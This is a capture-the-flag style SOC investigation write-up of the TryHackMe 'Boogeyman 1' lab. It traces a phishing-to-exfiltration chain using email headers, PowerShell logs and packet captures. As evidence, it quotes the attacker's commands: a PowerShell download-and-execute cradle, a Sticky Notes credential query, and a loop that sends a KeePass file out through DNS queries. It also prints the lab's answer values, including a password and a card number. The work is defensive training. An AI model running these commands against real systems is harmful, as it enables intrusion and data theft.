
# TryHackMe: Boogeyman 1 — SOC Investigation Report

> **Room:** [TryHackMe — Boogeyman 1](https://tryhackme.com/room/boogeyman1)  
> **Focus:** Email forensics, PowerShell analysis, HTTP C2 analysis, DNS exfiltration, and file recovery  
> **Tools used:** Thunderbird, `jq`, LNKParse3, Wireshark, TShark, Python, KeePass  
> **Artefacts analysed:** `dump.eml`, `powershell.json`, and `capture.pcapng`

---

## Executive Summary

This investigation reconstructed a complete intrusion chain attributed to the **Boogeyman** threat actor. The attacker delivered a phishing email containing a password-protected archive. The archive held a malicious Windows shortcut file that executed an encoded PowerShell downloader.

After execution, the attacker downloaded additional tooling, enumerated the victim host, accessed the Microsoft Sticky Notes SQLite database to recover a KeePass master password, established HTTP command-and-control communication, and exfiltrated a KeePass database through DNS A-record queries.

The exfiltrated `.kdbx` file was reconstructed from the captured DNS traffic and opened using the recovered master password. The recovered database contained a company credit-card record.

> **Lab disclaimer:** This write-up documents a TryHackMe training scenario. Sensitive values are included because they are required challenge answers. In a real SOC report, credentials and payment-card data should be masked and handled according to organisational policy.

---

## Investigation Objectives

The investigation aimed to answer the following questions:

1. Who sent the phishing email?
2. Who was targeted?
3. What attachment and execution technique were used?
4. What payload and infrastructure were used by the attacker?
5. What tools and commands were executed after compromise?
6. How did the attacker recover credentials?
7. How was sensitive data exfiltrated?
8. How could the exfiltrated KeePass database be reconstructed and analysed?

---

## Evidence Sources

| Artefact | Investigation purpose |
|---|---|
| `dump.eml` | Identify phishing sender, recipient, delivery service, message content, and attachment |
| `powershell.json` | Reconstruct PowerShell execution, tool downloads, credential discovery, and exfiltration logic |
| `capture.pcapng` | Validate attacker infrastructure, inspect HTTP C2 traffic, recover command output, and reconstruct DNS-exfiltrated data |

---

# 1. Phishing Email Investigation

## Question 1 — Phishing Sender

### Question Asked

> What is the email address used to send the phishing email?

### Investigation Direction

I reviewed the sender information and raw email headers in `dump.eml`. This identifies the external sender used to deliver the phishing message and provides an initial indicator of compromise.

### Evidence

<img width="933" height="684" alt="Screenshot 2026-10-01 at 15 46 11" src="https://github.com/user-attachments/assets/fdec0623-8548-4d5b-9a15-d40de72d7f14" />


```text
From: agriffin@bpakcaging.xyz
```

### Correct Answer

```text
agriffin@bpakcaging.xyz
```

---

## Question 2 — Victim Email Address

### Question Asked

> What is the email address of the victim?

### Investigation Direction

I reviewed the recipient field to identify the targeted employee and correlate the phishing message with later endpoint activity.

### Evidence

<img width="933" height="684" alt="Screenshot 2026-10-01 at 15 46 11" src="https://github.com/user-attachments/assets/fdec0623-8548-4d5b-9a15-d40de72d7f14" />


```text
To: julianne.westcott@hotmail.com
```

### Correct Answer

```text
julianne.westcott@hotmail.com
```

---

## Question 3 — Third-Party Mail Relay

### Question Asked

> What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

### Investigation Direction

I examined the raw email headers rather than relying only on the visible sender address. DKIM and List-Unsubscribe headers can reveal the mail-delivery platform used to send a phishing campaign.

### Steps Taken

View > Message Source > Search for key word 'DKIM-Signature'

<img width="515" height="464" alt="Screenshot 2026-10-01 at 15 46 45" src="https://github.com/user-attachments/assets/f9d11964-d829-4fae-a63a-86986a3e49cf" />


<img width="1020" height="844" alt="Screenshot 2026-10-01 at 15 47 23" src="https://github.com/user-attachments/assets/5c18b6fc-b304-4d47-9a9f-91baca2ed0dc" />


<img width="1237" height="718" alt="Screenshot 2026-10-01 at 15 48 01" src="https://github.com/user-attachments/assets/8e88bc45-da0c-4ebf-bb7a-4555b8b97353" />

### Evidence

The `DKIM-Signature` and `List-Unsubscribe` headers referenced Elastic Email infrastructure.

### Correct Answer

```text
elasticemail
```

---

## Question 4 — File in the Encrypted Archive

### Question Asked

> What is the name of the file inside the encrypted attachment?

### Investigation Direction

The phishing email included a password-protected archive. I used the password provided in the email body to extract the archive and identify its contents.

### Relevant Command

```bash
unzip Invoice.zip
```

### Evidence

The archive contained a Windows shortcut file:

```text
Invoice_20230103.lnk
```

### Correct Answer

```text
Invoice_20230103.lnk
```

---

## Question 5 — Archive Password

### Question Asked

> What is the password of the encrypted attachment?

### Investigation Direction

I reviewed the phishing email body for archive-opening instructions. Password-protected attachments are often used to bypass email security controls because encrypted contents cannot be easily scanned.

<img width="933" height="684" alt="Screenshot 2026-10-01 at 15 46 12" src="https://github.com/user-attachments/assets/f9b26102-c14b-4aad-9ae4-fb157d05d817" />

### Correct Answer

```text
Invoice2023!
```

---

# 2. Malicious Shortcut Analysis

## Question 6 — Encoded Payload

### Question Asked

> Based on the result of the LNKParse tool, what is the encoded payload found in the Command Line Arguments field?

### Investigation Direction

I analysed the malicious `.lnk` file because shortcut files can hide execution commands in their command-line arguments. The objective was to identify the PowerShell command and decode its encoded payload.

### Relevant Command

```bash
lnkparse Invoice_20230103.lnk
```

### Evidence

The shortcut contained this Base64-encoded PowerShell payload:

<img width="1555" height="1047" alt="Screenshot 2026-10-01 at 15 50 59" src="https://github.com/user-attachments/assets/2a874386-5083-40ce-994e-158fd1256c3d" />

```text
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

Decoded payload:

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

This command downloads a second-stage payload from attacker-controlled infrastructure and executes it using `Invoke-Expression`.

### Correct Answer

```text
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

---

# 3. PowerShell Log Analysis

## Investigation Method

The PowerShell log was JSON-formatted. I used `jq` to sort events chronologically and focus on `ScriptBlockText`, which retained the attacker’s executed PowerShell commands.

### Relevant Command

```bash
jq -s -c 'sort_by(.Timestamp) | .[] | {Timestamp, RecordID, Hostname, Descr, ScriptBlockText}' powershell.json
```

---

## Question 7 — Attacker Domains

### Question Asked

> What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order.

### Investigation Direction

I searched PowerShell script blocks for attacker-controlled domains and correlated them with the decoded LNK payload.

### Relevant Command

```bash
cat powershell.json | jq '.ScriptBlockText' | grep '.xyz'
```

### Evidence

File-hosting infrastructure:

```text
files.bpakcaging.xyz
```

C2 infrastructure:

```text
cdn.bpakcaging.xyz
```

### Correct Answer

```text
cdn.bpakcaging.xyz,files.bpakcaging.xyz
```

---

## Question 8 — Enumeration Tool

### Question Asked

> What is the name of the enumeration tool downloaded by the attacker?

### Investigation Direction

I reviewed PowerShell download commands and identified a known post-exploitation enumeration tool.

### Evidence

```powershell
iex(new-object net.webclient).downloadstring('[https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1)')
```

### Correct Answer

```text
Seatbelt
```

---

## Question 9 — Database File Accessed with `sq3.exe`

### Question Asked

> What is the file accessed by the attacker using the downloaded `sq3.exe` binary? Provide the full file path with escaped backslashes.

### Investigation Direction

I searched the chronologically sorted PowerShell log for execution of `sq3.exe`. This identified the SQLite database queried by the attacker.

### Relevant Command

```bash
jq -s -r 'sort_by(.Timestamp)[] | select((.ScriptBlockText // "" | ascii_downcase) | contains("sq3.exe")) | [.Timestamp, .RecordID, .ScriptBlockText] | @tsv' powershell.json
```

### Evidence

```powershell
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
```

The user account was `j.westcott`, allowing the complete path to be reconstructed.

### Correct Answer

```text
C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
```

---

## Question 10 — Software Associated with `plum.sqlite`

### Question Asked

> What is the software that uses the file identified in the previous question?

### Investigation Direction

The application package directory in the file path identifies the application responsible for the database.

### Evidence

```text
Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe
```

### Correct Answer

```text
Microsoft Sticky Notes
```

---

## Question 11 — Exfiltrated File

### Question Asked

> What is the name of the exfiltrated file?

### Investigation Direction

I searched for file-access commands and then followed the attacker’s later logic that read the file into memory for exfiltration.

### Evidence

```powershell
ls C:\Users\j.westcott\Documents\protected_data.kdbx;pwd
```

```powershell
$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
```

### Correct Answer

```text
protected_data.kdbx
```

---

## Question 12 — `.kdbx` File Type

### Question Asked

> What type of file uses the `.kdbx` file extension?

### Investigation Direction

The `.kdbx` extension is associated with KeePass password database files. Identifying the file type helped establish the likely sensitivity of the stolen data.

### Correct Answer

```text
KeePass
```

---

## Question 13 — Exfiltration Encoding

### Question Asked

> What is the encoding used during the exfiltration attempt of the sensitive file?

### Investigation Direction

I examined commands executed immediately after the attacker loaded `protected_data.kdbx` into memory.

### Relevant Command

```bash
jq -s -r 'sort_by(.Timestamp)[] | select(.Timestamp >= "2023-01-13 17:32:15Z") | [.Timestamp, .RecordID, .ScriptBlockText] | @tsv' powershell.json
```

### Evidence

```powershell
$hex = ($bytes|ForEach-Object ToString X2) -join '';pwd
```

The attacker converted every file byte to a hexadecimal representation.

### Correct Answer

```text
Hex
```

---

## Question 14 — Exfiltration Tool

### Question Asked

> What is the tool used for exfiltration?

### Investigation Direction

I continued reviewing the exfiltration commands after identifying the hexadecimal conversion.

### Evidence

```powershell
$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination;} echo "Done";pwd
```

The attacker used the built-in Windows `nslookup` utility to transmit 50-character hexadecimal chunks in DNS A-record query labels.

### Correct Answer

```text
nslookup
```

---

# 4. HTTP Command-and-Control Analysis

## Question 15 — Payload Hosting Software

### Question Asked

> What software is used by the attacker to host its presumed file/payload server?

### Investigation Direction

I inspected HTTP response headers from the attacker’s file-hosting server.

### Wireshark Method

1. Filter traffic for `files.bpakcaging.xyz`
2. Select a malicious download response
3. Right-click and choose **Follow → HTTP Stream**
4. Review the HTTP response headers

### Evidence

```text
Server: SimpleHTTP/0.6 Python/3.10.7
```

### Correct Answer

```text
Python
```

---

## Question 16 — HTTP Method Used for Command Output

### Question Asked

> What HTTP method is used by the C2 for the output of commands executed by the attacker?

### Investigation Direction

I distinguished between the attacker’s command-delivery traffic and the infected host’s command-output traffic.

- HTTP `GET` requests retrieved commands from the C2 server.
- HTTP `POST` requests sent execution results from the compromised endpoint back to the C2 server.

### Evidence

```powershell
$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{"X-38d2-8f49"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
```

### Correct Answer

```text
POST
```

---

## Question 17 — Exfiltration Protocol

### Question Asked

> What is the protocol used during the exfiltration activity?

### Investigation Direction

The endpoint evidence showed the attacker used `nslookup -q=A` to send hexadecimal data in DNS subdomains. I validated this behaviour using the network capture.

### Evidence

```powershell
nslookup -q=A "$line.bpakcaging.xyz" $destination
```

### Correct Answer

```text
DNS
```

---

## Question 18 — KeePass Master Password

### Question Asked

> What is the password of the exfiltrated file?

### Investigation Direction

The password was not expected to be stored in plaintext inside the encrypted KDBX file. I instead followed the attacker’s credential-discovery activity:

1. Identify the attacker’s use of `sq3.exe` against the Microsoft Sticky Notes database.
2. Locate the HTTP GET response containing the SQLite query.
3. Inspect the following HTTP POST request because POST was used to return command output.
4. Decode the decimal ASCII values stored in the POST body.

### Attacker Command

```powershell
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
```

### Relevant Wireshark Filter

```text
frame.number > 44452 && http.request.method == "POST" && http.request.uri contains "/27fe2489"
```

### Decoded Output

The POST body contained decimal ASCII values. Decoding them produced:

```text
\id=868150bd-a564-423b-9256-70d3781794b1 Master Password
\id=ad8b52f0-e1bb-40f6-bbf9-47a53f9180ab %p9^3!lL^Mz47E2GaT^y
```

The second note value was the KeePass master password.

### Correct Answer

```text
%p9^3!lL^Mz47E2GaT^y
```

---

# 5. DNS Exfiltration and File Reconstruction

## Question 19 — Credit Card Number in the Exfiltrated File

### Question Asked

> What is the credit card number stored inside the exfiltrated file?

### Investigation Direction

The file did not initially exist as a local artefact, so I reconstructed it from the DNS exfiltration traffic.

The attacker performed the following sequence:

1. Read `protected_data.kdbx` into memory.
2. Convert the file into hexadecimal.
3. Split the hexadecimal content into 50-character chunks.
4. Send each chunk as a DNS A-record query under `bpakcaging.xyz`.
5. Extract DNS query names in capture order.
6. Remove the attacker-controlled domain suffix.
7. Concatenate the remaining hexadecimal chunks.
8. Convert the hexadecimal data back into a binary file.
9. Open the recovered KDBX file using the recovered password.

### Attacker Exfiltration Commands

```powershell
$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
```

```powershell
$hex = ($bytes|ForEach-Object ToString X2) -join '';pwd
```

```powershell
$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination;} echo "Done";pwd
```

### Extract DNS Query Chunks

```bash
tshark -r capture.pcapng -Y 'dns.flags.response == 0 && dns.qry.type == 1 && ip.dst == 167.71.211.113 && dns.qry.name contains "bpakcaging.xyz"' -T fields -e frame.number -e dns.qry.name > dns_chunks.tsv
```

### Reconstruct the KDBX File

```bash
python3 -c 'import re; rows=(line.rstrip("\n").split("\t",1) for line in open("dns_chunks.tsv")); chunks=[(int(n),m.group(1)) for n,name in rows if (m:=re.fullmatch(r"([0-9a-fA-F]{2,50})\.bpakcaging\.xyz\.?",name,re.I))]; chunks.sort(); data=bytes.fromhex("".join(chunk for _,chunk in chunks)); open("protected_data.kdbx","wb").write(data); print(f"{len(chunks)} chunks, {len(data)} bytes, header={data[:8].hex()}")'
```

### Validation

The reconstructed file began with the expected KeePass KDBX header:

```text
03d9a29a67fb4bb5
```

I opened the reconstructed `protected_data.kdbx` file in KeePass using the recovered master password:

```text
%p9^3!lL^Mz47E2GaT^y
```

The `Company Card` record under the `Homebanking` group displayed the following account number.

### Correct Answer

```text
4024007128269551
```

---

# Attack Timeline

| Time / Phase | Activity |
|---|---|
| Initial access | Victim receives phishing email from `agriffin@bpakcaging.xyz` |
| User execution | Victim opens an encrypted archive containing `Invoice_20230103.lnk` |
| Payload execution | The LNK file runs an encoded PowerShell downloader |
| Payload retrieval | PowerShell retrieves the next-stage payload from `files.bpakcaging.xyz/update` |
| Discovery | The attacker downloads and executes Seatbelt |
| Tool transfer | The attacker downloads `sq3.exe` |
| Credential discovery | `sq3.exe` queries the Microsoft Sticky Notes `plum.sqlite` database |
| C2 | The compromised host retrieves commands using HTTP GET and returns output using HTTP POST |
| Collection | The attacker reads `protected_data.kdbx` from the victim's Documents directory |
| Exfiltration | The KDBX file is hex-encoded and transmitted through DNS A-record query labels |
| Objective completion | The recovered KeePass database reveals company payment-card data |

---

# Indicators of Compromise

| Indicator Type | Value |
|---|---|
| Phishing sender | `agriffin@bpakcaging.xyz` |
| Victim email | `julianne.westcott@hotmail.com` |
| File-hosting domain | `files.bpakcaging.xyz` |
| C2 domain | `cdn.bpakcaging.xyz` |
| C2 server | `cdn.bpakcaging.xyz:8080` |
| DNS exfiltration destination | `167.71.211.113` |
| Command retrieval path | `/b86459bb` |
| Command-result path | `/27fe2489` |
| Custom HTTP header | `X-38d2-8f49: 8cce49b0-b86459bb-27fe2489` |
| Malicious shortcut | `Invoice_20230103.lnk` |
| Attacker tools | `sb.exe`, `sq3.exe`, `Invoke-Seatbelt.ps1` |
| Exfiltrated file | `protected_data.kdbx` |
| Credential source | Microsoft Sticky Notes `plum.sqlite` |
| Exfiltration channel | DNS A-record queries |
| DNS exfiltration domain | `bpakcaging.xyz` |

---

# MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | Spearphishing Attachment — T1566.001 | Password-protected ZIP attachment containing a malicious LNK file |
| Execution | User Execution — T1204 | Victim opens the attachment |
| Execution | PowerShell — T1059.001 | Encoded PowerShell executed by the shortcut |
| Defence Evasion | Obfuscated Files or Information — T1027 | Base64-encoded PowerShell and hexadecimal exfiltration data |
| Discovery | System Information Discovery — T1082 | Seatbelt downloaded for host enumeration |
| Credential Access | Unsecured Credentials — T1552 | KeePass master password recovered from Sticky Notes |
| Command and Control | Application Layer Protocol: Web Protocols — T1071.001 | HTTP GET polling and POST output transfer |
| Command and Control | Application Layer Protocol: DNS — T1071.004 | Data transmitted in DNS query labels |
| Collection | Data from Local System — T1005 | Collection of `protected_data.kdbx` |
| Exfiltration | Exfiltration Over Alternative Protocol — T1048 | DNS used for KDBX file theft |

---

# Detection Opportunities

## Email Security

- Quarantine password-protected archives from unknown external senders where appropriate.
- Flag encrypted ZIP files containing `.lnk`, `.js`, `.vbs`, `.hta`, or executable content.
- Detect invoice-themed phishing messages that pressure users to open attachments.
- Review sender domains for impersonation and newly registered infrastructure.

## Endpoint Security

- Enable PowerShell Script Block Logging, Module Logging, and Transcription.
- Alert on PowerShell commands containing:
  - `-enc`
  - `-windowstyle hidden`
  - `Invoke-Expression`
  - `DownloadString`
  - `Invoke-WebRequest`
- Monitor execution of suspicious binaries from user-writable folders.
- Detect access to Microsoft Sticky Notes databases by unexpected processes.
- Alert when tools such as `sq3.exe`, `Seatbelt`, or similarly named utilities are downloaded and executed.

## Network Security

- Detect long, high-entropy DNS labels and unusually high DNS query volumes.
- Alert on repeated A-record requests to a single external destination.
- Identify PowerShell user agents communicating with external HTTP services.
- Detect regular HTTP polling patterns followed by POST requests containing encoded output.
- Block and investigate the identified domains, IP address, URI paths, and custom HTTP header.

---

# Key Lessons Learned

- A valid DKIM signature does not make an email safe; legitimate email-delivery platforms can be abused for phishing.
- Password-protected attachments can bypass automated content inspection and should be treated carefully.
- PowerShell Script Block Logging provides highly valuable evidence for reconstructing attacker behaviour.
- HTTP C2 traffic must be interpreted by function: command retrieval and command output may use different HTTP methods and paths.
- DNS exfiltration can be reconstructed when endpoint evidence reveals the attacker’s encoding method, chunk size, DNS record type, and domain format.
- Reconstructing the attacker’s method from endpoint telemetry is more reliable than guessing based only on network traffic.
- A SOC analyst should validate recovered files before analysing them; checking the KDBX header confirmed that the reconstructed file was structurally plausible before opening it.

---

# Conclusion

The Boogeyman 1 investigation demonstrated a complete attack chain from phishing to sensitive-data exfiltration.

The attacker used a password-protected archive and malicious shortcut to execute an encoded PowerShell payload. The compromised host then downloaded attacker tooling, performed local discovery, retrieved a KeePass password from Microsoft Sticky Notes, and communicated with C2 infrastructure over HTTP. Finally, the attacker converted a KeePass database into hexadecimal chunks and exfiltrated the data through DNS A-record queries.

By correlating email headers, PowerShell logs, HTTP streams, and DNS queries, I recovered the exfiltrated KeePass database and identified the targeted payment-card record. This investigation highlights the importance of evidence-driven analysis across multiple telemetry sources during SOC triage and incident response.
